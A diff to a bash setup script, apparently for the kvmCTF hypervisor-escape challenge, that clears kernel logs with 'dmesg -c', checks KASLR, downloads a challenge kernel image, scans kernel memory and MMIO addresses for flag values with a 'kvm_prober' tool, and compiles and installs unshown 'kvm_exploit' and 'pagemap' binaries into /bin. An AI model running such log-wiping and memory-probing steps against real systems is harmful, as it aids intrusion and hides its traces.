@@ -1,5 +1,8 @@
 #!/bin/bash
 
+echo "[*] clearing dmesg"
+dmesg -c
+
 echo "[*] disabling kaslr..."
 if grep -qw "nokaslr" /proc/cmdline; then
     echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
@@ -30,16 +33,16 @@ apt update -y >/dev/null
 apt install sudo git make xxd gcc python3-venv python3-pip gdb build-essential binutils tar -y >/dev/null || true
 apt install -f -y >/dev/null
 
-# sleep 2
-#  if [ ! -f "/root/vmlinux" ]; then
-#      echo "[*] Downloading latest kvmctf bundle for vmlinux..."
-#      wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
-#      tar -xzf latest.tar.gz
-#      mv /root/kvm_probe/kvmctf-6.1.74/vmlinux/vmlinux /root
-#      echo "[+] vmlinux moved to /root"
-#  else
-#      echo "[+] /root/vmlinux already exists, skipping download."
-# fi
+sleep 2
+ if [ ! -f "/root/vmlinux" ]; then
+     echo "[*] Downloading latest kvmctf bundle for vmlinux..."
+     wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
+     tar -xzf latest.tar.gz
+     mv /root/kvm_probe/kvmctf-6.1.74/vmlinux/vmlinux /root
+     echo "[+] vmlinux moved to /root"
+ else
+     echo "[+] /root/vmlinux already exists, skipping download."
+fi
 
 sleep 2
 echo "[*] downloading necessary headers..."
@@ -103,6 +106,76 @@ sleep 5
 # Check if stack canary protection is zeros
 echo "kvm_prober readkvmem $CANARY_ADDR 64"
 kvm_prober readkvmem $CANARY_ADDR 64
+
+sleep 5
+echo "[*] Write flags default value"
+echo "deadbeef41424344"
+echo "with little endian: 44434241efbeadde"
+
+echo "[*] Checking potential addresses for flags"
+
+# Scanning MMIO regions
+echo "[+] Scanning MMIO region 0x02A27968"
+kvm_prober readmmio_buf 0x02A27968 64
+sleep 5
+
+echo "[+] Scanning MMIO region 0x0275ef50"
+kvm_prober readmmio_buf 0x0275ef50 64
+sleep 5
+
+echo "[+] Scanning MMIO region 0x02b5ee10"
+kvm_prober readmmio_buf 0x02b5ee10 64
+sleep 5
+
+echo "[+] Scanning MMIO region 0x026279a8"
+kvm_prober readmmio_buf 0x026279a8 64
+sleep 5
+
+echo "[+] Scanning MMIO region 0x64279a8"
+kvm_prober readmmio_buf 0x64279a8 64
+sleep 5
+
+echo "[+] Scanning MMIO region 0x695ee10"
+kvm_prober readmmio_buf 0x695ee10 64
+sleep 5
+
+# Scanning kernel memory
+echo "[+] Scanning kernel memory 0xffffffff826279a8"
+kvm_prober readkvmem 0xffffffff826279a8 64
+sleep 5
+
+echo "[+] Scanning kernel memory 0xffffffff82b5ee10"
+kvm_prober readkvmem 0xffffffff82b5ee10 64
+sleep 5
+
+echo "[+] Scanning kernel memory 0xffffffff82A27968"
+kvm_prober readkvmem 0xffffffff82A27968 64
+sleep 5
+
+echo "[+] Scanning kernel memory 0xffffffff8275ef50"
+kvm_prober readkvmem 0xffffffff8275ef50 64
+
+sleep 5
+
+echo "compiling other exploits"
+
+sleep 2
+
+gcc -o kvm_exploit kvm_exploit.c
+
+sleep 5
+
+cp kvm_exploit /bin
+
+sleep 5
+
+gcc -o pagemap pagemap.c
+
+sleep 5
+
+cp pagemap /bin
+
+sleep 5
 
 sleep 5
 echo "[*] Write flags default value"
